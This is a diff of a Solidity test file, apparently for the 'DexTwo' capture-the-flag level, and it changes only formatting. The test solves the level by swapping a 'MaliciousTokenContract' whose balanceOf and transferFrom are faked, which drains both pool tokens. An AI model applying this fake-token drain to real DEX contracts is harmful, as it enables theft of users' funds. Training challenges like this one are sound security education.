@@ -8,16 +8,16 @@ contract DexTwoAttackTest is Test {
     address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
     DexTwoFactory public factory;
     DexTwo public instance;
-    
+
     function setUp() public {
         factory = new DexTwoFactory();
         instance = DexTwo(factory.createInstance(dummyPlayerAddress));
     }
-    
+
     function test_ShouldNotBeImmediatelySolvable() public {
-        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), false);
+        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
     }
-    
+
     function test_ShouldAllowThePlayerToSolveTheLevel() public {
         vm.startPrank(dummyPlayerAddress);
 
@@ -25,17 +25,17 @@ contract DexTwoAttackTest is Test {
 
         instance.swap(address(evilCoin), instance.token1(), 100);
         instance.swap(address(evilCoin), instance.token2(), 100);
-  
-        assertEq(factory.validateInstance(payable(address(instance)),dummyPlayerAddress), true);
+
+        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
     }
 }
 
 contract MaliciousTokenContract {
-    function balanceOf(address) public pure returns (uint){
+    function balanceOf(address) public pure returns (uint256) {
         return 100;
     }
 
-    function transferFrom(address, address, uint) public pure returns(bool) {
+    function transferFrom(address, address, uint256) public pure returns (bool) {
         return true;
     }
 }
